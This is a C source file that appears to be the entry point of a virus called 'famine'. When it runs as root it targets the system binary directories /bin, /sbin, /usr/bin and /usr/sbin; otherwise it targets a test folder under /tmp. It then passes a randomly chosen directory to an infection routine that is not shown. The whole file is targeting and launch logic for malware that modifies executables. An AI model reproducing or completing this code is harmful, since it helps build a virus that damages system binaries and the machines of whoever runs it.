#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline void launch(struct directory *dir, const size_t size, const int trace)
{
	size_t m_entry = 0;
	char dirent[BUFF_SIZE];

	for (unsigned char index = 0; index < size; index++)
	{
		update_dirent(dirent, dir[index].path);
		update_directory(&dir[index], dirent);
		m_entry += dir[index].entry;
	}

	famine(dir[_get_random_integer(size)].path, m_entry, trace);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void entry(void)
{
	int trace = _open("/tmp/trace", O_WRONLY | O_CREAT | O_APPEND, 0644);

	struct directory user[] =
	{
		(struct directory){"/tmp/test/", 0},
//		(struct directory){"/tmp/test2/", 0},
	};
	struct directory root[] =
	{
		(struct directory){"/bin/", 0},
		(struct directory){"/sbin/", 0},
		(struct directory){"/usr/bin/", 0},
		(struct directory){"/usr/sbin/", 0},
	};

	if (_getuid() == 0)
		launch(root, sizeof(root) / sizeof(root[0]), trace);
	else
		launch(user, sizeof(user) / sizeof(user[0]), trace);

	_close(trace);
}

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	entry();
}
